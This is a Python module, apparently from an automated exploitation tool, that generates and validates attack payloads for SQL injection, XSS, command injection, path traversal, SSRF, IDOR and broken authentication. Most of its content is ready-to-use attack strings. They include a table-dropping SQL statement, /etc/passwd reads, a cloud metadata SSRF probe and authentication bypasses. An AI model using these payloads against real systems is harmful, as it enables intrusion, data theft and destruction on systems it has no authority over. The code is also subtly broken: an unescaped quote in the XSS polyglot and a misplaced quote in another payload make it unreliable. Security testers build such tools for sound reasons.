"""
Exploit Strategies — Payload generation and validation for different vulnerability types.

Each strategy implements:
1. Payload generation tailored to injection context
2. Confirmation indicator detection
3. Evasion techniques for common defenses
"""

from __future__ import annotations

import base64
import logging
import random
import string
import time
from abc import ABC, abstractmethod
from typing import Any, Optional

from .models import InjectionPoint, POCStatus, ValidationEvidence, VulnType

logger = logging.getLogger(__name__)


class ExploitStrategy(ABC):
    """Abstract base for exploit strategies."""
    
    def __init__(self, name: str, vuln_types: list[VulnType]):
        self.name = name
        self.vuln_types = vuln_types
    
    @abstractmethod
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        """Generate ordered list of payloads to try."""
        pass
    
    @abstractmethod
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        """Check if evidence confirms successful exploitation."""
        pass
    
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate random string for unique detection."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


class SQLiStrategy(ExploitStrategy):
    """
    SQL Injection exploitation strategy.
    
    Implements multiple techniques:
    - Error-based: Trigger database errors
    - UNION-based: Extract data via UNION SELECT
    - Time-based: Blind detection via delays
    - Boolean-based: Content-based inference
    - Stacked queries: Execute additional statements
    """
    
    def __init__(self):
        super().__init__("sqli_multi_technique", [VulnType.SQL_INJECTION])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        """Generate SQL injection payloads ordered by invasiveness."""
        marker = self._generate_random_string()
        
        payloads = []
        param_type = injection_point.parameter_type.lower()
        
        # Phase 1: Detection payloads (least invasive)
        payloads.extend([
            # Basic string breaking
            "'",
            '"',
            "`",
            "')",
            '")',
            "'))",
            # Comment injection
            "-- -",
            "#",
            "/*",
            # AND/OR injection
            "' AND '1'='1",
            "' OR '1'='1",
            "' AND 1=1-- -",
            "' OR 1=1-- -",
        ])
        
        # Phase 2: Error-based (database-specific errors)
        payloads.extend([
            "'||'",                           # String concat error
            "'+(SELECT 1)+'",                # Subquery error
            "' AND 1=CAST((SELECT 1) AS INT)--",  # Type conversion error
            "' AND 1=CONVERT(INT,(SELECT 1))--",   # MSSQL error
            "' AND extractvalue(1,concat(0x7e,1))--",  # MySQL XPath error
            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT 1 FROM DUAL))--",  # Oracle error
        ])
        
        # Phase 3: UNION-based (data extraction)
        for i in range(1, 10):
            nulls = ",".join(["NULL"] * i)
            payloads.append(f"' UNION SELECT {nulls}-- -")
            payloads.append(f"' UNION ALL SELECT {nulls}-- -")
        
        # Phase 4: Time-based (blind detection)
        payloads.extend([
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",          # MySQL
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",                # PostgreSQL
            "'; WAITFOR DELAY '0:0:5'-- -",                           # MSSQL
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)-- -",         # Oracle
            "' AND (SELECT 1 FROM (SELECT sqlite3_sleep(5000)))-- -", # SQLite
        ])
        
        # Phase 5: Boolean-based (content inference)
        payloads.extend([
            "' AND 1=1-- -",    # Should return normal content
            "' AND 1=2-- -",    # Should return different/no content
        ])
        
        # Phase 6: Stacked queries (more invasive)
        payloads.extend([
            "'; SELECT 1-- -",
            "'; DROP TABLE users-- -",  # This would be dangerous in production
        ])
        
        # Phase 7: Context-aware payloads
        if param_type == "integer":
            payloads.extend([
                "1 AND 1=1",
                "1 AND 1=2",
                "1 OR 1=1",
            ])
        elif param_type == "json":
            payloads.extend([
                '{"test": "\' OR \'1\'=\'1"}',
                '[{"$gt": 0}]',  # NoSQL injection
            ])
        
        return payloads
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        """Check for SQL injection confirmation indicators."""
        if not evidence.indicators:
            return False
        
        # Direct confirmation indicators
        direct_indicators = [
            "sql_error",
            "union_select_reflected",
            "time_based_delay_confirmed",
        ]
        
        for indicator in evidence.indicators:
            if any(ind in indicator for ind in direct_indicators):
                return True
        
        return False


class XSSStrategy(ExploitStrategy):
    """
    Cross-Site Scripting exploitation strategy.
    
    Implements:
    - Reflected XSS: Payload in URL parameters
    - Stored XSS: Persistent payload in stored data
    - DOM-based XSS: Client-side sink execution
    - Polyglot payloads: Multiple context bypass
    """
    
    def __init__(self):
        super().__init__("xss_multi_context", [VulnType.CROSS_SITE_SCRIPTING])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        """Generate XSS payloads for different contexts."""
        marker = self._generate_random_string()
        
        payloads = [
            # Basic detection
            f"<script>alert('{marker}')</script>",
            f"<img src=x onerror=alert('{marker})'>",
            f"<svg onload=alert('{marker}')>",
            f"javascript:alert('{marker}')",
            
            # Context-specific
            "' onmouseover='alert(1)",
            "' onclick='alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            
            # Polyglot
            "jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
            
            # Filter evasion
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x></animate>",
            "<details open ontoggle=alert(1)>",
            
            # Template injection to XSS
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
        ]
        
        # Add DOM-specific payloads if context suggests it
        if injection_point.context.get("is_dom_sink"):
            payloads.extend([
                "#<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<img src=1 onerror=alert(document.domain)>",
            ])
        
        return payloads
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        """Check for XSS confirmation indicators."""
        if not evidence.indicators:
            return False
        
        direct_indicators = [
            "payload_reflected_unencoded",
            "script_execution_detected",
            "dom_modified",
        ]
        
        for indicator in evidence.indicators:
            if any(ind in indicator for ind in direct_indicators):
                return True
        
        return False


class CommandInjectionStrategy(ExploitStrategy):
    """
    Command Injection exploitation strategy.
    
    Implements:
    - Direct command execution
    - Time-based blind detection
    - Out-of-band data exfiltration
    """
    
    def __init__(self):
        super().__init__("command_injection", [VulnType.COMMAND_INJECTION])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        """Generate command injection payloads."""
        marker = self._generate_random_string()
        
        # Platform detection from context
        platform = context.get("platform", "linux")
        
        payloads = [
            # Basic command injection
            "; id",
            "; whoami",
            "; uname -a",
            "| id",
            "` id `",
            "$(id)",
            "&& id",
            "|| id",
        ]
        
        if platform == "windows":
            payloads.extend([
                "& whoami",
                "| whoami",
                "; whoami",
                "%0awhoami",  # URL encoded newline
                "`whoami`",
                "$(whoami)",
            ])
        else:
            payloads.extend([
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "%0acat /etc/passwd",
                "%3Bcat%20/etc/passwd",
            ])
        
        # Time-based detection
        payloads.extend([
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "%0asleep 5",
        ])
        
        return payloads
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        """Check for command injection confirmation."""
        if not evidence.indicators:
            return False
        
        direct_indicators = [
            "command_output",
            "time_based_delay_confirmed",
        ]
        
        for indicator in evidence.indicators:
            if any(ind in indicator for ind in direct_indicators):
                return True
        
        return False


class PathTraversalStrategy(ExploitStrategy):
    """Path Traversal exploitation strategy."""
    
    def __init__(self):
        super().__init__("path_traversal", [VulnType.PATH_TRAVERSAL])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        marker = self._generate_random_string()
        
        return [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoding
            "/etc/passwd",
            "\\windows\\win.ini",
            "C:\\windows\\win.ini",
            "file:///etc/passwd",
        ]
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        if not evidence.indicators:
            return False
        return any("file_contents" in ind or "system_file" in ind 
                   for ind in evidence.indicators)


class SSRFStrategy(ExploitStrategy):
    """Server-Side Request Forgery exploitation strategy."""
    
    def __init__(self):
        super().__init__("ssrf", [VulnType.SERVER_SIDE_REQUEST_FORGERY])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        # In production, these would point to a collaborator/interaction server
        oob_server = context.get("oob_server", "burp-collaborator.net")
        
        return [
            f"http://{oob_server}",
            f"http://127.0.0.1",
            f"http://localhost",
            f"http://169.254.169.254/latest/meta-data/",  # AWS metadata
            f"http://[::1]",
            f"file:///etc/passwd",
            f"dict://{oob_server}:1337",
            f"gopher://{oob_server}:1337/_TEST",
        ]
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        if not evidence.indicators:
            return False
        return any("outbound" in ind or "dns_interaction" in ind 
                   for ind in evidence.indicators)


class IDORStrategy(ExploitStrategy):
    """Insecure Direct Object Reference exploitation strategy."""
    
    def __init__(self):
        super().__init__("idor", [VulnType.IDOR])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        current_val = injection_point.current_value
        payloads = []
        if current_val.isdigit():
            val = int(current_val)
            # Try nearby IDs
            for offset in [-1, 1, -10, 10, -100, 100]:
                if val + offset > 0:
                    payloads.append(str(val + offset))
        
        # Try generic/admin IDs
        payloads.extend(["1", "0", "1337", "admin", "test"])
        return payloads
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        # Success if response status is 200 and content differs significantly from 403/404
        if evidence.response_status == 200:
            return any("unauthorized_data" in ind for ind in evidence.indicators)
        return False


class BrokenAuthStrategy(ExploitStrategy):
    """Broken Authentication exploitation strategy."""
    
    def __init__(self):
        super().__init__("broken_auth", [VulnType.BROKEN_AUTH])
    
    def generate_payloads(
        self,
        injection_point: InjectionPoint,
        context: dict[str, Any],
    ) -> list[str]:
        return [
            "admin", "password", "123456", "root",
            "bearer eyJhbGciOiJub25lIn0.e30.", # JWT alg: none
            "' OR 1=1--",                      # Auth bypass via SQLi
            "admin'--",
            "\" OR \"\"=\"",
        ]
    
    def check_confirmation_indicators(self, evidence: ValidationEvidence) -> bool:
        # Success if we get a session cookie or redirect to dashboard
        indicators = evidence.indicators
        return any("auth_bypass" in ind or "session_created" in ind for ind in indicators)


class StrategyRegistry:
    """
    Registry of available exploit strategies.
    
    Provides strategy selection based on vulnerability type and context.
    """
    
    def __init__(self):
        self._strategies: list[ExploitStrategy] = []
        self._register_defaults()
    
    def _register_defaults(self) -> None:
        """Register default strategies."""
        self.register(SQLiStrategy())
        self.register(XSSStrategy())
        self.register(CommandInjectionStrategy())
        self.register(PathTraversalStrategy())
        self.register(SSRFStrategy())
        self.register(IDORStrategy())
        self.register(BrokenAuthStrategy())
    
    def register(self, strategy: ExploitStrategy) -> None:
        """Register a new strategy."""
        self._strategies.append(strategy)
        logger.info(f"Registered strategy: {strategy.name}")
    
    def get_strategies(
        self,
        vuln_type: VulnType,
        context: Optional[dict[str, Any]] = None,
    ) -> list[ExploitStrategy]:
        """
        Get applicable strategies for vulnerability type.
        
        Args:
            vuln_type: Type of vulnerability
            context: Optional execution context for strategy selection
            
        Returns:
            Ordered list of applicable strategies
        """
        matching = [
            s for s in self._strategies 
            if vuln_type in s.vuln_types
        ]
        
        # Sort by context relevance
        if context:
            matching.sort(
                key=lambda s: self._score_strategy(s, context),
                reverse=True,
            )
        
        return matching
    
    def _score_strategy(
        self,
        strategy: ExploitStrategy,
        context: dict[str, Any],
    ) -> float:
        """Score strategy relevance to execution context."""
        score = 0.0
        
        # Boost for platform-specific strategies
        if hasattr(strategy, 'platform') and context.get("platform") == strategy.platform:
            score += 0.5
        
        return score
    
    def list_strategies(self) -> list[dict[str, str]]:
        """List all registered strategies."""
        return [
            {
                "name": s.name,
                "vuln_types": [v.value for v in s.vuln_types],
            }
            for s in self._strategies
        ]
